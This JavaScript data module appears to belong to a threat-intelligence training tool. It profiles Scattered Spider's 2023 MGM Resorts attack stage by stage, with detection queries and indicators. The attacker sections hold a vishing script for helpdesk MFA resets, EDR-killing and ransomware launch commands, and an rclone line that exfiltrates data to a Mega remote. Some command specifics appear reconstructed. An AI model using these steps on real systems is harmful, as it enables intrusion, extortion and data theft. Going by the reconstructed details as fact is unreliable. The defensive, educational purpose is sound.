const scatteredspider = {
  id: "scatteredspider",
  name: "Scattered Spider",
  aliases: ["UNC3944", "Muddled Libra", "Star Fraud", "0ktapus", "Octo Tempest"],
  origin: "Western",
  motivation: "Financial",
  attribution: "Formally Attributed",
  description:
    "Scattered Spider (UNC3944) is an English-speaking cybercriminal collective whose 2023 MGM Resorts attack caused $100M+ in losses using no technical exploits — only vishing, MFA fatigue, and legitimate cloud tools. Members are primarily US and UK nationals aged 19-22, exceptionally skilled at social engineering Okta and Azure AD environments.",
  campaigns: [
    {
      id: "mgm-ransomware-2023",
      name: "MGM Resorts Ransomware Attack (2023)",
      year: "2023",
      target: "MGM Resorts International & Caesars Entertainment",
      summary:
        "Scattered Spider called MGM Resorts' IT helpdesk, impersonated an employee using LinkedIn-sourced details, and convinced agents to reset MFA in under 10 minutes. They then deployed ALPHV/BlackCat ransomware across VMware ESXi hypervisors, causing a 10-day outage affecting hotel check-ins, casino floors, ATMs, and digital room keys. Caesars Entertainment paid ~$15M in ransom to avoid similar disruption.",
      sources: [
        { title: "CISA Advisory AA23-320A — Scattered Spider", publisher: "CISA / FBI", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a" },
        { title: "#StopRansomware: ALPHV Blackcat (Update)", publisher: "CISA / FBI / HHS", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-353a" },
        { title: "Scattered Spider Attempts to Blur the Lines Between Threat Actor Groups", publisher: "CrowdStrike Intelligence", url: "https://www.crowdstrike.com/blog/scattered-spider-attempts-to-blur-the-lines-between-threat-actor-groups/" },
        { title: "UNC3944: SMS Phishing and SIM Swapping Leads to Ransomware", publisher: "Mandiant", url: "https://www.mandiant.com/resources/blog/unc3944-financially-motivated-targeted-attack" },
      ],
      diamondModel: {
        adversary: {
          name: "Scattered Spider (UNC3944 / 0ktapus)",
          sponsor: "Independent English-speaking cybercriminal collective — no nation-state affiliation; primarily US and UK nationals, ages 19-22",
          aliases: ["UNC3944", "Muddled Libra", "Star Fraud", "0ktapus", "Octo Tempest", "Scatter Swine"],
          motivation: "Financial gain via ransomware extortion and data theft; notoriety within underground cybercriminal communities (Telegram, Discord, 'The Comm')",
        },
        capability: {
          malware: ["ALPHV/BlackCat ransomware (RaaS partner)", "STONESTOP EDR killer", "AUKILL EDR terminator", "Rclone (data exfiltration)", "Custom PowerShell persistence"],
          ttps: ["T1566.004 — Vishing IT helpdesk impersonation", "T1078 — Valid Accounts + MFA fatigue", "T1538 — Cloud Service Dashboard enumeration", "T1486 — ALPHV ESXi ransomware", "T1657 — Financial extortion + data theft"],
          sophistication: "Criminal — extraordinary social engineering capability; zero technical exploits; full abuse of legitimate cloud identity platforms (Okta, Azure AD, AWS IAM); ALPHV RaaS affiliate",
        },
        infrastructure: {
          domains: ["ALPHV ransomware RaaS infrastructure (.onion leak site)", "Actor-registered helpdesk-impersonation domains", "Legitimate Okta SSO (abused tenant, not compromised infrastructure)"],
          ips: ["Commercial VPN exit nodes (Mullvad, NordVPN)", "Residential proxies (SIM swap coordination)"],
          hosting: "Commercial VPN services for attack sourcing; ALPHV ransomware-as-a-service backend for encryption/extortion; Telegram and Discord for actor coordination and victim negotiation",
        },
        victim: {
          sectors: "Hospitality and gaming (MGM Resorts International, Caesars Entertainment), retail, technology, telecommunications (SIM swap targets for MFA bypass)",
          geography: "United States — MGM Las Vegas (Bellagio, MGM Grand, Aria), MGM New York and Boston properties; Caesars Entertainment nationwide; broader enterprise Okta customers across sectors",
          targeting: "Large enterprises with Okta SSO deployments and high-value payment card data; specifically targets IT helpdesk staff and service desk agents as initial social engineering vector",
        },
      },
      stages: [
        {
          id: "vishing",
          name: "IT Helpdesk Vishing Attack",
          ttp: "T1566.004",
          ttpName: "Phishing: Spearphishing Voice",
          phase: "Initial Access",
          attacker: {
            summary:
              "A Scattered Spider operator called MGM Resorts' IT helpdesk, having researched a target employee's full name, employee ID, and job title via LinkedIn. Impersonating the employee convincingly, they convinced the helpdesk agent to reset the target's Okta MFA within approximately 10 minutes. No technical vulnerability was exploited — the attack succeeded entirely through social engineering and the helpdesk's lack of out-of-band identity verification procedures. This technique is known as 'helpdesk bypass' or 'vishing.'",
            tools: ["LinkedIn OSINT (target research)", "VoIP caller ID spoofing", "Social engineering script", "Okta admin portal (post-compromise)"],
            commands: [
              "// No technical commands — pure social engineering",
              "// Reconstructed actor script (from incident reports and FBI affidavit):",
              "// 'Hi, this is [Employee Name], employee ID [number from LinkedIn].'",
              "// 'I'm traveling in [city] for a conference and I'm locked out of my Okta account.'",
              "// 'I need my MFA reset urgently — I have a meeting in 20 minutes.'",
              "// Helpdesk agent reset MFA without secondary out-of-band verification",
              "// Total elapsed time from call initiation to Okta access: ~10 minutes",
            ],
          },
          defender: {
            logs: [
              "IT helpdesk ticket created: MFA reset via phone call (ServiceNow/Jira ITSM log)",
              "Okta System Log — user.mfa.factor.deactivate: MFA factor removed for account",
              "Okta System Log — user.mfa.factor.activate: new MFA factor enrolled from new device",
              "Okta System Log: new session established from IP not previously seen for this user",
            ],
            detection:
              "Implement callback verification for all MFA reset requests: agents must call back the employee at their number in the corporate directory — never the number the caller provides. Require manager approval for MFA resets on privileged or admin accounts. Security awareness training: recognize urgency language ('I have a meeting in 20 minutes') as a social engineering pressure technique. For admin accounts, require in-person or video verification with photo ID. MGM implemented these controls post-incident.",
            siemQuery:
              'index=okta eventType="user.mfa.factor.deactivate" | stats min(_time) as deactivate_time by target.alternateId | join target.alternateId [ search index=okta eventType="user.mfa.factor.activate" | stats min(_time) as activate_time by target.alternateId ] | eval gap_min=round((activate_time-deactivate_time)/60,1) | where gap_min < 30',
            ifMissed:
              "Scattered Spider gains valid Okta SSO credentials with MFA bypassed on a real employee account. They authenticate as that employee to MGM's entire Okta-integrated application stack — hundreds of internal systems, cloud services, VPN, and corporate email. Within minutes, cloud infrastructure enumeration begins to identify ESXi hypervisor management and staging opportunities for ransomware.",
          },
          iocs: [
            { type: "Event", indicator: "Okta MFA deactivate + activate on same account within 30 minutes", description: "Scattered Spider vishing IOA — rapid MFA reset cycle indicates helpdesk social engineering followed immediately by attacker factor enrollment" },
            { type: "Event", indicator: "Helpdesk MFA reset ticket not submitted by account owner's registered device", description: "Phone-initiated MFA reset without secondary verification — Scattered Spider primary initial access indicator" },
            { type: "User-Agent", indicator: "Okta session from new device + new geolocation within minutes of MFA reset", description: "Scattered Spider post-vishing access — attacker session from unexpected device immediately after helpdesk-facilitated MFA reset" },
          ],
        },
        {
          id: "mfa-bypass",
          name: "MFA Fatigue & Okta SSO Abuse",
          ttp: "T1078",
          ttpName: "Valid Accounts",
          phase: "Persistence",
          attacker: {
            summary:
              "With Okta SSO access via the vishing attack, Scattered Spider registered their own MFA device to the compromised account and began accessing all Okta-integrated applications. For other high-value accounts, they conducted MFA push fatigue attacks — sending 20-30 MFA push notifications in rapid succession until targets approved out of confusion or frustration, often accompanied by a social engineering call claiming the pushes were a system error. Within MGM's environment, Okta SSO provided access to Azure AD, AWS console, VPN, and VMware vCenter.",
            tools: ["Okta admin portal", "MFA push notification spam tool", "Azure AD (post-SSO)", "AWS CLI (post-SSO)"],
            commands: [
              "// Post-vishing: enroll attacker's authenticator to compromised Okta account",
              "// Okta API POST /api/v1/users/{userId}/factors — enroll new TOTP factor",
              "// MFA fatigue attack: send rapid push notification flood to target phone",
              "// Simultaneously call target: 'You need to approve the MFA push to unlock your account'",
              "// Azure enumeration via Okta SAML token",
              "az ad user list --filter \"accountEnabled eq true\" --query '[].{Name:displayName,UPN:userPrincipalName}'",
              "az ad group list --query '[].{Name:displayName,Members:members}'",
            ],
          },
          defender: {
            logs: [
              "Rapid Okta MFA push notifications to same account (>5 in 10 minutes) (Okta System Log)",
              "Okta MFA push approved from unusual device or geographic location (Okta System Log)",
              "Okta SAML token used to federate into Azure AD from new IP (Azure AD Sign-in log)",
              "AWS console access via Okta federation from new IP (AWS CloudTrail — ConsoleLogin)",
            ],
            detection:
              "Enable number matching for Okta Verify push — users must enter the displayed number to prevent accidental approval. Set push lockout after 5 denied pushes. Okta ThreatInsight detects anomalous push patterns. Conditional Access: require compliant managed device for any admin access — Scattered Spider used personal unmanaged devices. Alert on Okta SAML tokens used to access high-value applications (vCenter, AWS) from new IPs immediately after an MFA reset event.",
            siemQuery:
              'index=okta eventType="system.push.send_factor_verify_push" | stats count as push_count earliest(_time) as first latest(_time) as last by target.alternateId | where push_count > 5 | eval duration_min=round((last-first)/60,1) | where duration_min < 10',
            ifMissed:
              "Scattered Spider has persistent Okta SSO access with their own MFA device enrolled. Password resets for the compromised account do not evict them — they control the MFA factor. Azure AD, AWS, VPN, and VMware vCenter are accessible via the persistent SSO session. The actor begins comprehensive cloud infrastructure enumeration to identify ransomware staging targets.",
          },
          iocs: [
            { type: "Event", indicator: "5+ Okta MFA push notifications to same account within 10 minutes", description: "Scattered Spider MFA fatigue attack — rapid push notification flood forcing accidental or frustrated approval from target user" },
            { type: "Operation", indicator: "Okta factor enrollment from new unmanaged device within 30 min of helpdesk MFA reset", description: "Scattered Spider persistence — attacker-controlled authenticator enrolled immediately after vishing-enabled MFA reset" },
            { type: "Access Rights", indicator: "Okta SSO federation to Azure AD + AWS + VPN within 60 seconds from new IP", description: "Scattered Spider rapid lateral access via SSO — same session used to access multiple high-value cloud services immediately post-authentication" },
          ],
        },
        {
          id: "discovery",
          name: "Cloud Infrastructure Enumeration",
          ttp: "T1538",
          ttpName: "Cloud Service Dashboard",
          phase: "Discovery",
          attacker: {
            summary:
              "Using their Okta SSO foothold, Scattered Spider enumerated all cloud and on-premises systems accessible via SSO — identifying VMware vCenter management interfaces, ESXi hypervisor hosts, backup systems, and IT management consoles. The Azure AD admin portal, AWS Management Console, and VMware vSphere were accessed via legitimate admin interfaces (no command line required). Targeting ESXi hypervisors was deliberate: encrypting hypervisors destroys all virtual machines simultaneously, maximizing ransomware impact with minimal effort.",
            tools: ["Okta admin portal (SSO enumeration)", "Azure AD portal", "AWS Management Console", "VMware vSphere / vCenter", "SharePoint (internal IT runbooks)"],
            commands: [
              "// Cloud enumeration via legitimate web admin consoles (no CLI tools needed)",
              "// Azure AD: enumerate users, groups, service principals, conditional access policies",
              "az ad group list --query '[].{Name:displayName}'",
              "// AWS: enumerate EC2 instances, S3 buckets, IAM roles",
              "aws ec2 describe-instances --region us-east-1 --query 'Reservations[*].Instances[*].{ID:InstanceId,Name:Tags[?Key==Name].Value}'",
              "aws s3 ls",
              "// VMware vCenter: enumerate ESXi hosts and VM inventory (via web UI)",
              "// Key discovery: 40+ ESXi hypervisors running hotel ops VMs",
            ],
          },
          defender: {
            logs: [
              "Azure AD: mass enumeration of users, groups, applications via portal (Azure AD Audit log)",
              "AWS CloudTrail: DescribeInstances, ListBuckets, ListRoles from new IP (CloudTrail)",
              "VMware vCenter: admin portal authentication from new IP (vCenter Appliance audit log)",
              "SharePoint: access to IT infrastructure runbooks and network topology documents (O365 Unified Audit)",
            ],
            detection:
              "Alert on admin portal access to Azure, AWS, and VMware vCenter from new IPs in the same session — especially from an IP that just completed an Okta authentication. VMware vCenter should use separate MFA not federated through Okta SSO — Scattered Spider specifically exploited SSO to reach vCenter. Monitor for SharePoint access to IT documentation libraries from new devices. AWS GuardDuty detects unusual enumeration patterns and credential anomalies.",
            siemQuery:
              'index=azure_ad operationName IN ("List users","List groups","List applications","List service principals") | stats dc(operationName) as ops_count values(operationName) as ops by ipAddress, userPrincipalName | where ops_count >= 3 | sort -ops_count',
            ifMissed:
              "Scattered Spider has a complete map of MGM's cloud and virtualization infrastructure — 40+ ESXi hypervisors running hotel operations (reservations, room keys, casino floor management, ATMs, point-of-sale). This discovery directly enables the subsequent ransomware attack: the actor knows exactly which hypervisors to encrypt to cause maximum operational disruption.",
          },
          iocs: [
            { type: "Operation", indicator: "Azure AD mass enumeration from new IP within 30 min of Okta SSO authentication", description: "Scattered Spider discovery pattern — rapid cloud service enumeration immediately after establishing initial SSO foothold" },
            { type: "Operation", indicator: "VMware vCenter admin access via Okta SSO federation from new device", description: "Scattered Spider hypervisor targeting — vCenter accessed via SSO federation for ransomware staging reconnaissance" },
            { type: "Target Pattern", indicator: "ESXi host enumeration via vCenter from new admin IP (unmanaged device)", description: "Scattered Spider pre-ransomware recon — enumerating VMware ESXi host inventory to plan maximum-impact ALPHV deployment" },
          ],
        },
        {
          id: "ransomware",
          name: "ALPHV/BlackCat ESXi Ransomware Deployment",
          ttp: "T1486",
          ttpName: "Data Encrypted for Impact",
          phase: "Impact",
          attacker: {
            summary:
              "Scattered Spider deployed ALPHV/BlackCat ransomware — a Rust-based RaaS with a dedicated VMware ESXi variant — targeting MGM's hypervisors first, then Windows systems. Encrypting ESXi hypervisors simultaneously disabled hundreds of virtual machines with a single sweep. Before deploying ransomware, STONESTOP and AUKILL killed all EDR processes. Customer data was exfiltrated using Rclone for double-extortion leverage. MGM hotel check-in systems, casino floor machines, ATMs, and digital room keys went offline for 10 days.",
            tools: ["ALPHV/BlackCat ransomware ESXi variant", "STONESTOP EDR process killer", "AUKILL EDR terminator", "Rclone (data exfiltration)", "PsExec (Windows deployment)"],
            commands: [
              "// Pre-encryption: kill EDR agents across all targets",
              ".\\STONESTOP.exe --kill-all-av --include-csagent",
              "// ALPHV ESXi variant — targets /vmfs/volumes directory",
              "./alphv_esxi --access-token <token> --file-list /vmfs/volumes",
              "// Pre-encryption data exfiltration for double extortion",
              "rclone copy --config rclone.conf /vmfs/volumes/datastores mega:mgm-backup",
              "// Windows deployment via PsExec with compromised admin creds",
              "psexec.exe -s -d \\\\<target> C:\\Windows\\Temp\\alphv.exe --access-token <token>",
            ],
          },
          defender: {
            logs: [
              "STONESTOP/AUKILL: EDR process termination event before ransomware (last EDR telemetry)",
              "ESXi hostd.log: mass VMDK file modification events across datastores",
              "Rclone process created with cloud storage configuration file (Sysmon Event ID 1)",
              "Mass file extension rename across Windows file shares in seconds (EDR bulk rename alert)",
            ],
            detection:
              "VMware vCenter: enable audit logging for all datastore operations; alert on mass VM shutdown or modification. EDR self-protection: ensure the EDR service is protected against termination by non-SYSTEM processes — STONESTOP specifically targets EDR drivers. Rclone is a known exfiltration tool; any rclone.exe execution should alert SOC immediately. Maintain ESXi snapshots to offsite immutable storage not accessible from vCenter admin credentials.",
            siemQuery:
              'index=endpoint EventCode=1 (Image="*\\rclone.exe" OR Image="*\\rclone*" OR CommandLine="*rclone*") | stats count by host, user, Image, CommandLine, ParentImage | union [ search index=endpoint (Image="*stonestop*" OR Image="*aukill*" OR CommandLine="*kill-all-av*") | stats count by host, user, Image ]',
            ifMissed:
              "ALPHV ransomware encrypts all 40+ ESXi hypervisors and hundreds of Windows servers. MGM hotel operations go entirely offline — check-in kiosks fail, digital room keys stop working, casino floors go dark, ATMs are unavailable. The 10-day outage costs $8.4M per day in lost revenue. 37 million customer records including SSNs and passport numbers are exfiltrated for double extortion. Total damages exceed $100M.",
          },
          iocs: [
            { type: "SHA-256", indicator: "f837f1cd60e9941aa60f7be50a8f2aaaac380f560db8ee001408f35c1b7a97cb", description: "ALPHV/BlackCat ransomware ESXi variant SHA-256 — targets VMware VMDK files on /vmfs/volumes datastores" },
            { type: "Tool", indicator: "STONESTOP.exe / AUKILL.exe (EDR process killer)", description: "Scattered Spider EDR defense evasion — terminates CrowdStrike, Defender ATP, and other security agents before ransomware deployment" },
            { type: "Tool", indicator: "rclone.exe with cloud storage config (Mega, AWS S3)", description: "Scattered Spider data exfiltration tool — Rclone used to copy customer PII before encryption for double extortion leverage" },
          ],
        },
        {
          id: "extortion",
          name: "Financial Extortion & Data Leak Threat",
          ttp: "T1657",
          ttpName: "Financial Theft",
          phase: "Impact",
          attacker: {
            summary:
              "Scattered Spider exfiltrated personal data of 37 million MGM Resorts customers (names, SSNs, driver's license numbers, passport numbers) and threatened to publish it on ALPHV's leak site as ransom leverage. When MGM refused to pay, Scattered Spider made media statements and published data samples. Caesars Entertainment, facing the same threat, paid approximately $15 million. Scattered Spider communicated directly with media outlets, attributed their own attack, and taunted MGM publicly via Telegram — unusual behavior for ransomware actors.",
            tools: ["ALPHV dark web leak site (Tor .onion)", "Telegram (actor communications)", "Rclone (pre-staged data)", "Media outreach (direct actor statements to The Record, Bloomberg)"],
            commands: [
              "// Financial extortion — no technical commands; business-level coercion",
              "// ALPHV leak site post: 'MGM chose not to pay. Data release begins in 48 hours.'",
              "// Direct actor statement to The Record (journalist-verified attribution)",
              "// Caesars Entertainment 8-K (Sept 14, 2023): disclosed ~$15M ransom payment",
              "// MGM Resorts 8-K (Oct 5, 2023): disclosed $100M+ in losses, refused ransom",
              "// 37 million customer records including SSN/passport stolen (MGM SEC disclosure)",
              "// FBI arrested multiple Scattered Spider members in 2024 (UK/US nationals)",
            ],
          },
          defender: {
            logs: [
              "ALPHV ransomware ransom note deployed to all encrypted filesystems (file creation event)",
              "Customer PII database bulk export to external cloud storage pre-encryption (DLP alert)",
              "SEC 8-K material cybersecurity incident filing triggered (regulatory — 4-day disclosure requirement)",
              "Dark web monitoring: victim organization named on ransomware leak site (threat intel feed)",
            ],
            detection:
              "Data loss prevention (DLP): alert on bulk exports of tables containing SSN, passport, or payment card data to any external destination. Cyber extortion playbook: engage IR counsel and law enforcement before any ransom payment decision. Per-FBI guidance, ransom payment does not guarantee data deletion and funds criminal organizations. Maintained offline backup copies reduce ransom leverage — if systems can be restored, negotiating position improves. Dark web monitoring services provide early warning of data publication.",
            siemQuery:
              'index=dlp (action="upload" OR action="copy" OR action="sync") datatype IN ("SSN","passport_number","PII","payment_card") dest_type="external_cloud" | stats sum(bytes_transferred) as total_bytes by user, dest_host | where total_bytes > 10000000 | sort -total_bytes',
            ifMissed:
              "Scattered Spider holds 37 million customer records indefinitely as ongoing extortion leverage. Even after ransomware remediation, data leak threat persists. Regulatory notification requirements (CCPA, GDPR, Nevada state law, new SEC rules) apply regardless of payment. Class action litigation follows. Long-term reputational damage to hotel brand. MGM's $100M+ loss demonstrates the full business impact of a successful social engineering attack with no technical exploitation.",
          },
          iocs: [
            { type: "Operation", indicator: "ALPHV leak site — MGM Resorts victim listing with data samples (September 2023)", description: "Scattered Spider ransomware extortion — ALPHV dark web leak site used to publish stolen customer data samples as ransom pressure" },
            { type: "Operation", indicator: "Caesars Entertainment SEC 8-K: material cybersecurity incident + ~$15M ransom payment (Sept 14, 2023)", description: "Scattered Spider confirmed financial theft — SEC disclosure of ransom payment by second hospitality sector victim in same campaign" },
            { type: "Operation", indicator: "MGM Resorts SEC 8-K: $100M+ cybersecurity incident impact (Oct 5, 2023)", description: "Scattered Spider confirmed impact scope — SEC 8-K disclosure of material losses from 10-day operational outage and 37M customer data breach" },
          ],
        },
      ],
    },
  ],
}

export default scatteredspider
